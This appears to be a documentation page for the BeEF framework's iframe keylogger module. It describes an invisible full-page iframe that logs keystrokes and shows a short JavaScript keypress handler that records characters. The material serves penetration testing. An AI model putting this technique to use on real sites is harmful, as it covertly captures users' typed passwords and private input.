## Summary

* **Objective**: Log keys through a 100% iframe overlay
* **Authors**: antisnatchor
* **Browsers**: all except Opera

* [Code](https://github.com/beefproject/beef/tree/master/modules/misc/iframe_keylogger)

## Internal Working

Adds a 100% size invisible iframe and an event listener that fires on keypress.

```js

    // add the pressed key to the keystroke stream array
    function keyPressHandler(evt) {
        evt = evt || window.event;
        if (evt) {
            var keyCode = evt.charCode || evt.keyCode;
            charLogged = String.fromCharCode(keyCode);
            stream.push(charLogged);
        }
    }


```

## Feedback


